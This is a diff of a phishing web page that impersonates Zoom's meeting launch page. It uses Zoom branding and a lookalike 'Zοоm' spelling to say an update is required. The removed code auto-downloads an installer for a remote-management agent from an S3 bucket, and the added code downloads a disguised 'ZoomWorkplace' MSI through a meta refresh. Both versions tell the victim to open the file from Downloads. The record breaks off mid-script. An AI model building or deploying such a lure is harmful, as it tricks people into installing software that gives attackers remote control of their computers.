@@ -1,292 +1,899 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <title>Joining Meeting</title>
-    <link rel="shortcut icon" href="https://us02st1.zoom.us/zoom.ico">
-    <meta name="robots" content="noindex,nofollow,noarchive">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap"
+<html>
+    <head>
+        <meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1">
+		<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1.0">
+		<meta name="description" content="Zoom is the leader in modern enterprise video communications, with an easy, reliable cloud platform for video and audio conferencing, chat, and webinars across mobile, desktop, and room systems.">
+		<meta name="robots" content="noindex,nofollow,noarchive">
+		<title>Launch Meeting - Zoom</title>
+		<link rel="shortcut icon" href="https://us02st1.zoom.us/zoom.ico">
+        <meta http-equiv="refresh" content="10; url=ZoomWorkplace_YU0RHQEEFUV4_4DGDKXK8OSU8_windows_x64.msi" />
+		
+		<style>
+      .At6Ofnrg {
+        -webkit-animation: oMeNmCjN 1.4s linear infinite;
+        animation: oMeNmCjN 1.4s linear infinite;
+        background: conic-gradient(#fff 2%, #0e72ed);
+        border-radius: 50%;
+        height: 32px;
+        position: relative;
+        width: 32px
+      }
 
-      rel="stylesheet">
-    <style>
-    body {
-        margin: 0;
-        font-family: "Inter", Arial, sans-serif;
-        background: #f7f7f7;
-        color: #232333;
-    }
+      .At6Ofnrg:after,
+      .At6Ofnrg:before {
+        content: "";
+        position: absolute
+      }
 
-    .header {
-        background: #ffffff;
-        border-bottom: 1px solid #e5e5e5;
-        padding: 18px 40px;
-    }
+      .At6Ofnrg:before {
+        background: #0e72ed;
+        border-radius: 50%;
+        height: 3px;
+        left: 50%;
+        margin-left: -1.5px;
+        top: 0;
+        width: 3px
+      }
 
-    .logo {
-        font-size: 28px;
-        font-weight: 600;
-        color: #2d8cff;
-    }
+      .mJy749x6 {
+        background: -webkit-gradient(linear, left top, left bottom, from(hsla(0, 0%, 100%, 0)), to(#0e72ed));
+        background: linear-gradient(180deg, hsla(0, 0%, 100%, 0), #0e72ed)
+      }
 
-    .container {
-        text-align: center;
-        margin-top: 90px;
-    }
-
-    h1 {
-        font-size: 30px;
-        font-weight: 600;
-        margin-bottom: 20px;
-    }
-
-    p {
-        font-size: 16px;
-        color: #4a4a4a;
-        margin: 10px 0;
-        line-height: 1.6;
-    }
-
-    .link {
-        color: #2d8cff;
-        text-decoration: none;
-        font-weight: 500;
-    }
-
-    .link:hover {
-        text-decoration: underline;
-    }
-
-    .btn {
-        margin-top: 30px;
-        background-color: #2d8cff;
-        color: #fff;
-        border: none;
-        padding: 14px 32px;
-        border-radius: 8px;
-        font-size: 16px;
-        font-weight: 500;
-        cursor: pointer;
-        transition: all 0.2s ease;
-    }
-
-    .btn:hover {
-        background-color: #1a73e8;
-    }
-
-    /* Progress bar */
-    .progress-container {
-        width: 300px;
-        height: 6px;
-        background: #e6e6e6;
-        border-radius: 10px;
-        margin: 25px auto;
-        overflow: hidden;
-    }
-
-    .progress-bar {
+      .mJy749x6:after {
+        background: -webkit-gradient(linear, left bottom, left top, color-stop(10%, hsla(0, 0%, 100%, 0)), color-stop(30%, rgba(14, 113, 235, .5)), to(#0e72ed));
+        background: linear-gradient(0deg, hsla(0, 0%, 100%, 0) 10%, rgba(14, 113, 235, .5) 30%, #0e72ed);
+        border-radius: 16px 0 0 16px;
         height: 100%;
-        width: 0%;
-        background: #2d8cff;
-        animation: loading 3s infinite;
-    }
+        left: 0;
+        top: 0;
+        width: 50%
+      }
 
-    @keyframes loading {
-        0% { width: 0%; }
-        50% { width: 80%; }
-        100% { width: 100%; }
-    }
+      .jZWDYHYu {
+        background: #fff;
+        border-radius: 50%;
+        height: 26px;
+        left: 50%;
+        margin: -13px 0 0 -13px;
+        position: absolute;
+        top: 50%;
+        width: 26px;
+        z-index: 1
+      }
 
-    .divider {
-        width: 60%;
-        margin: 50px auto;
-        border-top: 1px solid #e5e5e5;
-    }
-
-    .footer {
-        margin-top: 60px;
-        text-align: center;
-        font-size: 13px;
-        color: #777;
-    }
-
-    .footer a {
-        color: #2d8cff;
-        text-decoration: none;
-        margin: 0 5px;
-    }
-
-    .footer a:hover {
-        text-decoration: underline;
-    }
-</style> </head>
-  <body>
-    <div id="header" role="banner" class="clearfix"> <svg style="margin-top: 30px; margin-left: 30px;"
-
-        width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo">
-        <path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path>
-      </svg> </div>
-    <div class="container">
-      <h1>Joining Meeting</h1>
-      <p>Sorry, You do not have the latest version of Zοоm Workplace App
-        installed.</p>
-      <p> The latest version of our Application will download automatically,
-        kindly install to join the Remote Desktop Meeting. </p>
-      <div class="progress-container">
-        <div class="progress-bar"></div>
-      </div>
-      <p> If the download doesn't start automatically, please <a href="#" class="link"
-
-          id="manualDownload">Download Manually</a> </p>
-      <button onclick="launchMeeting()" style="padding:12px 20px; background:#0b5fff; color:#fff; border:none; cursor:pointer;">
-        Launch Meeting </button>
-      <div class="divider"></div>
-      <p style="font-size:13px;"> By joining a meeting, you agree to our <a href="#"
-
-          class="link">Terms of Service</a> and <a href="#" class="link">Privacy
-          Statement</a> </p>
-    </div>
-    <div id="toast" style="
-    position: fixed;    bottom: 20px;    right: 20px;    background: #333;    color: #fff;    padding: 14px 18px;    border-radius: 6px;    font-family: Arial, sans-serif;    font-size: 14px;    opacity: 0;    transform: translateY(20px);    transition: all 0.4s ease;    z-index: 9999;">
-      Go to Downloads folder and click on <b>Zoom_X9TWGUQ0RITC_19SYPURD17668_windows_x64.msi</b> to
-      launch meeting </div>
-    <div class="footer">
-      <p style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">©2026
-        Zoom Communications, Inc.<span>&nbsp;</span><span style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;">All
-          rights reserved.</span></p>
-      <p class="LP3K7kSq" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><a
-
-          href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Trust
-          Center |</a><span>&nbsp;</span><a href="#"
-
-          target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Acceptable
-          Use Guidelines |</a><span>&nbsp;</span><a href="#"
-
-          target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Legal
-          &amp; Compliance |</a><span>&nbsp;</span><a href="#"
-
-          tabindex="0" role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Do
-          Not Sell My Personal Information |</a><span>&nbsp;</span><a href="#"
-
-          tabindex="0" role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Cookie
-          Preferences</a></p>
-    </div>
-    <script>
-const files = {
-    windows: "https://superops-wininstaller-prod.s3.us-east-2.amazonaws.com/agent/4379458487719305216/X9TWGUQ0RITC_19SYPURD17668_windows_x64.msi",
-    mac: "https://superops-wininstaller-prod.s3.us-east-2.amazonaws.com/agent/4379458487719305216/X9TWGUQ0RITC_19SYPURD17668_Macos_amd64.pkg"
-};
-
-let selectedFile = "";
-
-function detectOS() {
-    const ua = navigator.userAgent.toLowerCase();
-    if (ua.includes("win")) return "windows";
-    if (ua.includes("mac")) return "mac";
-    return "windows";
-}
-
-
-function showToast(message, duration = 6000) {
-    const toast = document.getElementById("toast");
-    if (!toast) return;
-
-    toast.innerHTML = message;
-    toast.style.opacity = "1";
-    toast.style.transform = "translateY(0)";
-
-    setTimeout(() => {
-        toast.style.opacity = "0";
-        toast.style.transform = "translateY(20px)";
-    }, duration);
-}
-
-
-function updateProgress(percent) {
-    const bar = document.querySelector(".progress-bar");
-    if (bar) {
-        bar.style.width = percent + "%";
-    }
-}
-
-
-async function downloadFile(url) {
-    try {
-        showToast("⬇️ Download started...");
-
-        const response = await fetch(url);
-        if (!response.ok) throw new Error("Download failed");
-
-        const contentLength = response.headers.get("content-length");
-        const total = contentLength ? parseInt(contentLength) : 0;
-
-        const reader = response.body.getReader();
-        let received = 0;
-        let chunks = [];
-
-        while (true) {
-            const { done, value } = await reader.read();
-            if (done) break;
-
-            chunks.push(value);
-            received += value.length;
-
-            if (total) {
-                updateProgress((received / total) * 100);
-            }
+      @-webkit-keyframes oMeNmCjN {
+        0% {
+          -webkit-transform: rotate(0deg);
+          transform: rotate(0deg)
         }
 
-        updateProgress(100);
+        to {
+          -webkit-transform: rotate(1turn);
+          transform: rotate(1turn)
+        }
+      }
 
-        const blob = new Blob(chunks);
-        const blobUrl = window.URL.createObjectURL(blob);
+      @keyframes oMeNmCjN {
+        0% {
+          -webkit-transform: rotate(0deg);
+          transform: rotate(0deg)
+        }
 
-        const a = document.createElement("a");
-        a.href = blobUrl;
-        a.download = url.split("/").pop();
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
+        to {
+          -webkit-transform: rotate(1turn);
+          transform: rotate(1turn)
+        }
+      }
+    </style>
+    
+    
+    <style>
+      .mbTuDeF1 {
+        background: #0e72ed;
+        border-radius: 12px;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        color: #fff;
+        cursor: pointer;
+        display: inline-block;
+        font-size: 16px;
+        line-height: 32px;
+        margin-top: 12px;
+        padding: 8px 40px;
+        text-align: center
+      }
 
-        window.URL.revokeObjectURL(blobUrl);
+      .mbTuDeF1 a,
+      a.mbTuDeF1 {
+        color: #fff !important;
+        text-decoration: none !important
+      }
 
-        showToast("✅ Download complete. You can open the file.");
+      .mbTuDeF1:hover {
+        background-color: #2681f2
+      }
 
-    } catch (err) {
-        console.log("Fallback download");
-        window.location.href = url;
+      .mbTuDeF1:active {
+        background-color: #0c63ce
+      }
+
+      .L0Cesy2V {
+        background: rgba(82, 82, 128, .09);
+        color: #222230
+      }
+
+      .L0Cesy2V a,
+      a.L0Cesy2V {
+        color: #222230;
+        text-decoration: none
+      }
+
+      .L0Cesy2V:active,
+      .L0Cesy2V:hover {
+        background-color: rgba(82, 82, 128, .2)
+      }
+
+      .IR4P3WW4 {
+        background: #fff;
+        color: #2369db
+      }
+
+      .IR4P3WW4 a,
+      a.IR4P3WW4 {
+        color: #222230;
+        text-decoration: none
+      }
+
+      .IR4P3WW4:active,
+      .IR4P3WW4:hover {
+        background-color: rgba(82, 82, 128, .2)
+      }
+
+      @media (max-width:500px) {
+        .mbTuDeF1 {
+          border-radius: 16px;
+          font-size: 17px;
+          line-height: 48px;
+          padding: 0;
+          width: 100%
+        }
+      }
+
+      @media (min-width:500px) {
+        .L0Cesy2V {
+          margin-top: 24px !important;
+          width: 100%
+        }
+      }
+    </style>
+    <style>
+      .mbTuDeF1 {
+        background: #0e72ed;
+        border-radius: 12px;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        color: #fff;
+        cursor: pointer;
+        display: inline-block;
+        font-size: 16px;
+        line-height: 32px;
+        margin-top: 12px;
+        padding: 8px 40px;
+        text-align: center
+      }
+
+      .mbTuDeF1 a,
+      a.mbTuDeF1 {
+        color: #fff !important;
+        text-decoration: none !important
+      }
+
+      .mbTuDeF1:hover {
+        background-color: #2681f2
+      }
+
+      .mbTuDeF1:active {
+        background-color: #0c63ce
+      }
+
+      .L0Cesy2V {
+        background: rgba(82, 82, 128, .09);
+        color: #222230
+      }
+
+      .L0Cesy2V a,
+      a.L0Cesy2V {
+        color: #222230;
+        text-decoration: none
+      }
+
+      .L0Cesy2V:active,
+      .L0Cesy2V:hover {
+        background-color: rgba(82, 82, 128, .2)
+      }
+
+      .IR4P3WW4 {
+        background: #fff;
+        color: #2369db
+      }
+
+      .IR4P3WW4 a,
+      a.IR4P3WW4 {
+        color: #222230;
+        text-decoration: none
+      }
+
+      .IR4P3WW4:active,
+      .IR4P3WW4:hover {
+        background-color: rgba(82, 82, 128, .2)
+      }
+
+      @media (max-width:500px) {
+        .mbTuDeF1 {
+          border-radius: 16px;
+          font-size: 17px;
+          line-height: 48px;
+          padding: 0;
+          width: 100%
+        }
+      }
+
+      @media (min-width:500px) {
+        .L0Cesy2V {
+          margin-top: 24px !important;
+          width: 100%
+        }
+      }
+    </style>
+    
+    
+    
+    <style>
+      .I0MG3p8Q {
+        background: #fff;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        font-family: Inter, Open Sans, Helvetica, Arial, sans-serif;
+        margin: 0 auto;
+        max-width: 840px;
+        min-height: 480px;
+        padding: 130px 40px 48px;
+        position: relative;
+        text-align: center;
+        -webkit-box-orient: vertical;
+        -webkit-box-direction: normal;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center
+      }
+
+      .I0MG3p8Q:focus {
+        outline: none
+      }
+
+      @media (max-width:500px) {
+        .I0MG3p8Q {
+          -webkit-box-shadow: none;
+          box-shadow: none;
+          padding: 16px
+        }
+      }
+
+      @media (max-width:320px) {
+        .I0MG3p8Q {
+          padding: 0
+        }
+      }
+
+      .bhauZU7H {
+        color: rgba(4, 4, 19, .56);
+        font-size: 18px;
+        width: 100%
+      }
+
+      .bhauZU7H hr {
+        background: #ededf4;
+        border: none;
+        height: 1px;
+        margin: 48px 0;
+        width: 100%
+      }
+
+      .bhauZU7H h1,
+      .bhauZU7H h2,
+      .bhauZU7H h3,
+      .bhauZU7H h4 {
+        font-weight: 400;
+        margin: 0
+      }
+
+      .bhauZU7H h1 {
+        font-size: 20px;
+        line-height: 40px;
+        padding: 12px 0
+      }
+
+      .bhauZU7H h2 {
+        padding: 5px 0
+      }
+
+      .bhauZU7H h2,
+      .bhauZU7H h3 {
+        font-size: 14px;
+        line-height: 24px
+      }
+
+      .bhauZU7H h4 {
+        color: #747487;
+        font-size: 12px;
+        line-height: 14px
+      }
+
+      .bhauZU7H h1,
+      .bhauZU7H h2,
+      .bhauZU7H h3 {
+        color: #232333
+      }
+
+      .bhauZU7H a {
+        color: #0e72ed;
+        cursor: pointer;
+        text-decoration: none
+      }
+
+      .bhauZU7H a,
+      .bhauZU7H b {
+        white-space: nowrap
+      }
+
+      @media (max-width:500px) {
+        .bhauZU7H h1 {
+          font-size: 24px;
+          font-weight: 700;
+          line-height: 28px;
+          margin-bottom: 44px;
+          padding: 0
+        }
+
+        .bhauZU7H hr {
+          margin: 40px 0
+        }
+      }
+
+      .Xnv35Eoe {
+        font-size: 16px;
+        line-height: 40px;
+        line-height: 20px;
+        padding: 14px 44px
+      }
+
+      .KoUPUvXJ {
+        color: #747487;
+        font-size: 12px;
+        font-weight: 300;
+        margin: 32px auto;
+        text-align: center;
+        width: 100%
+      }
+
+      .KoUPUvXJ a {
+        color: currentColor;
+        text-decoration: none
+      }
+
+      .KoUPUvXJ a:hover {
+        text-decoration: underline
+      }
+
+      .dLDxYimD {
+        margin-bottom: 12px;
+        -webkit-transition: opacity .2s ease-in-out;
+        transition: opacity .2s ease-in-out
+      }
+
+      .AJKPZk_N {
+        opacity: 0
+      }
+
+      .Kpjt1kh0 {
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        font-size: 14px;
+        margin: 24px auto 0;
+        max-width: 400px;
+        padding: 0 32px;
+        -webkit-box-orient: vertical;
+        -webkit-box-direction: normal;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        justify-items: stretch;
+        -webkit-box-pack: stretch;
+        -ms-flex-pack: stretch;
+        justify-content: stretch
+      }
+
+      .z3BOzAyD {
+        margin-top: 16px
+      }
+
+      .x2RD4pnS {
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-orient: vertical;
+        -webkit-box-direction: normal;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center
+      }
+
+      .ifP196ZE {
+        min-height: 124px
+      }
+
+      .pUmU_FLW h3+h3 {
+        margin-top: 20px
+      }
+
+      h2.DPkTxDJ4 {
+        font-size: 16px;
+        margin-bottom: 20px;
+        margin-top: 8px
+      }
+
+      .HfAIzoib {
+        margin-top: 28px
+      }
+
+      .DbUdsbWR {
+        margin-top: 16px
+      }
+
+      .JBnFKgLm {
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        left: 16px;
+        position: fixed;
+        top: 72px;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        padding: 8px
+      }
+
+      .JBnFKgLm svg {
+        margin-right: 4px
+      }
+
+      .Au8RuTlW {
+        color: #232333;
+        display: block;
+        margin-top: 16px;
+        text-transform: capitalize
+      }
+
+      .O8AXHPh2 {
+        font-size: 12px;
+        left: 0;
+        opacity: .5;
+        padding: 10px;
+        pointer-events: none;
+        position: fixed;
+        text-align: left;
+        top: 60px;
+        white-space: pre-line;
+        z-index: 999
+      }
+
+      .CD2Ka_oN {
+        background: transparent !important;
+        border: 0;
+        color: #a2a9b6;
+        font-size: 12px;
+        margin: 0 !important;
+        padding: 1em 0;
+        position: relative
+      }
+
+      .CD2Ka_oN:before {
+        border: solid #d0d0d5;
+        border-width: 0 99vw;
+        content: attr(data-content);
+        left: 50%;
+        line-height: 1px;
+        padding: 0 1ch;
+        position: absolute;
+        -webkit-transform: translateX(-50%);
+        -ms-transform: translateX(-50%);
+        transform: translateX(-50%);
+        white-space: nowrap;
+        width: -webkit-fit-content;
+        width: -moz-fit-content;
+        width: fit-content
+      }
+
+      .qRNwYb64 {
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        -ms-flex-pack: center;
+        justify-content: center
+      }
+    </style>
+    
+    
+    
+    
+    <style>
+      * {
+        font-family: "Open Sans", "Helvetica", "Arial", sans-serif;
+      }
+
+      /* For header & footer */
+      #header_outer {
+        position: relative;
+        font-size: 12px;
+        font-weight: 600;
+        width: 100%;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .header-logo {
+        height: 25px;
+        outline: none;
+        border: 0;
+        width: auto;
+        margin-left: 24px;
+        margin-right: 20px;
+        vertical-align: middle;
+        left: 0;
+      }
+
+      .action-btns {
+        float: right;
+        padding-right: 24px;
+        font-weight: 400;
+      }
+
+      .caret {
+        display: inline-block;
+        width: 0;
+        height: 0;
+        margin-left: 6px;
+        vertical-align: middle;
+        border-top: 4px solid;
+        border-right: 4px solid transparent;
+        border-left: 4px solid transparent;
+      }
+
+      /**
+ * For branding
+ */
+      #header .logo {
+        height: 35px;
+        margin-left: 20px;
+        width: auto;
+        margin-right: 20px;
+        vertical-align: middle;
+        box-sizing: border-box;
+        border: 0;
+      }
+
+      /*  less than 767px  */
+      @media screen and (max-width : 767px) {
+        #header .logo {
+          height: 25px;
+        }
+      }
+
+      html,
+      body {
+        height: 100%;
+        color: #232333;
+      }
+
+      body {
+        margin: 0;
+        padding-top: 64px;
+        box-sizing: border-box;
+      }
+
+      #header_container {
+        position: fixed;
+        width: 100%;
+        top: 0;
+        z-index: 300;
+        background-color: rgba(255, 255, 255, .97);
+        height: 64px;
+        line-height: 64px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.2);
+      }
+
+      #footer_container {
+        padding: 24px;
+        width: 100%;
+        bottom: 0;
+        z-index: 300;
+        min-height: 64px;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        color: rgba(4, 4, 19, 0.56);
+        ;
+        box-sizing: border-box;
+      }
+
+      #footer_container a {
+        color: inherit;
+      }
+
+      #footer_container p {
+        margin: 0;
+        font-size: 14px;
+        line-height: 1.5;
+      }
+
+      /* Copied from common.css */
+      a {
+        text-decoration: none;
+        color: #0E71EB;
+      }
+
+      a:hover {
+        text-decoration: underline;
+      }
+
+      @media (min-width: 1200px) {
+        #header_container .container {
+          width: 1200px !important;
+        }
+      }
+
+      @media (min-width: 1400px) {
+        #header_container .container {
+          width: 1400px !important;
+        }
+      }
+
+      /* Mobile header/footer */
+      @media screen and (max-width : 500px) {
+        body {
+          padding-top: 60px;
+        }
+
+        #header_container {
+          height: 60px;
+          line-height: 60px;
+        }
+
+        #footer_container {
+          margin-top: 32px;
+          padding-bottom: 8px;
+        }
+
+        #footer_container p {
+          margin: 0;
+          font-size: 12px;
+        }
+
+        #footer_container span {
+          white-space: nowrap;
+        }
+      }
+    </style>
+    <style>
+      .Co1A6ZJW {
+        color: #0e71eb;
+        cursor: pointer;
+        position: relative
+      }
+
+      .cVDRP5Ns,
+      .Co1A6ZJW {
+        display: inline-block
+      }
+
+      .cVDRP5Ns {
+        border-left: 4px solid transparent;
+        border-right: 4px solid transparent;
+        border-top: 4px solid;
+        height: 0;
+        margin-left: 2px;
+        vertical-align: middle;
+        width: 0
+      }
+
+      .FB7pOWNX {
+        background-clip: padding-box;
+        background-color: #fff;
+        border: 1px solid #eee;
+        border-radius: 4px;
+        -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, .175);
+        box-shadow: 0 6px 12px rgba(0, 0, 0, .175);
+        margin-top: 6px;
+        min-width: 100px;
+        padding: 8px 0;
+        position: absolute;
+        right: 0;
+        text-shadow: none
+      }
+
+      .FB7pOWNX:before {
+        border-bottom: 7px solid rgba(0, 0, 0, .2);
+        border-left: 7px solid transparent;
+        border-right: 7px solid transparent;
+        right: 39px;
+        top: -7px
+      }
+
+      .FB7pOWNX:after,
+      .FB7pOWNX:before {
+        content: "";
+        display: inline-block !important;
+        position: absolute
+      }
+
+      .FB7pOWNX:after {
+        border-bottom: 6px solid #fff;
+        border-left: 6px solid transparent;
+        border-right: 6px solid transparent;
+        right: 40px;
+        top: -6px
+      }
+
+      .TUsNbnp1 {
+        color: #232323;
+        font-size: 14px;
+        line-height: 15px;
+        padding: 10px 20px;
+        text-decoration: none;
+        text-transform: inherit;
+        white-space: nowrap
+      }
+
+      .TUsNbnp1:hover,
+      .h_GAeXIH {
+        background: #f5f5f5
+      }
+
+      .h_GAeXIH {}
+
+      .Co1A6ZJW li {
+        display: block;
+        list-style: none
+      }
+    </style>
+    <style>
+    /* Style for the alert div */
+    .custom-alert {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background-color: white; /* Red background */
+      color: black;
+      padding: 15px 30px;
+      border-radius: 8px;
+      font-size: 15px;
+      font-family: 'Arial', sans-serif;
+      z-index: 9999;
+      display: none; /* Hidden by default */
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Optional shadow */
     }
+
+    /* Style for close button inside the alert */
+    .close-btn {
+      position: absolute;
+      top: 5px;
+      right: 10px;
+      font-size: 20px;
+      background: transparent;
+      border: none;
+      color: white;
+      cursor: pointer;
+    }
+	@keyframes slideIn {
+  0% { top: -100px; opacity: 0; }
+  100% { top: 20px; opacity: 1; }
 }
+  </style>
+		
+    </head>
+    <body>
+    <div id="header_container" role="banner" class="">
+      <div id="header_outer" class="container clearfix">
+        <div id="header" role="banner" class="clearfix">
+          <a href="/" aria-label="Zoom Logo" class="imglink yLyeC3Mp">
+            <svg style="margin-top: 12px;" width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo" style="width: 115px !important;">
+              <path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path>
+            </svg>
+            <!---->
+          </a>
+        </div>
+      </div>
+    </div>
+	<div id="alertBox" class="custom-alert">
+    <span id="alertContent"><div role="alert" class="AIf0J3hN cvF4vE8e REZiVTB5"><div class="egxStE60">Go to <b>Downloads</b> folder and click on <br> <b>ZoomWorkplace... .exe</b> to launch meeting</div></div></span>
+  </div>
+	<script>
+    // Function to show the alert
+    function showAlert() {
+      var alertBox = document.getElementById('alertBox');
+      var alertContent = document.getElementById('alertContent');
+      
+      alertBox.style.display = 'block';  // Show the alert
 
-
-function startDownload() {
-    const os = detectOS();
-    selectedFile = files[os];
-    downloadFile(selectedFile);
-}
-
-
-function launchMeeting() {
-
-    showToast(
-        '📂 Go to Downloads and open <b>Zoom_Workspace_7TCEGG8UFZLS_19SYPURD17668_windows_x64.msi</b>',
-        10000
-    );
-
-
-}
-
-window.addEventListener("DOMContentLoaded", () => {
-    const manualBtn = document.getElementById("manualDownload");
-    if (manualBtn) {
-        manualBtn.addEventListener("click", function(e) {
-            e.preventDefault();
-            startDownload();
-        });
+      // Hide the alert after 30 seconds
+      setTimeout(function() {
+        alertBox.style.display = 'none';
+      }, 30000); // 30 seconds
     }
 
-    setTimeout(startDownload, 1200);
-});
-</script>
+    // Function to manually close the alert
+    function closeAlert() {
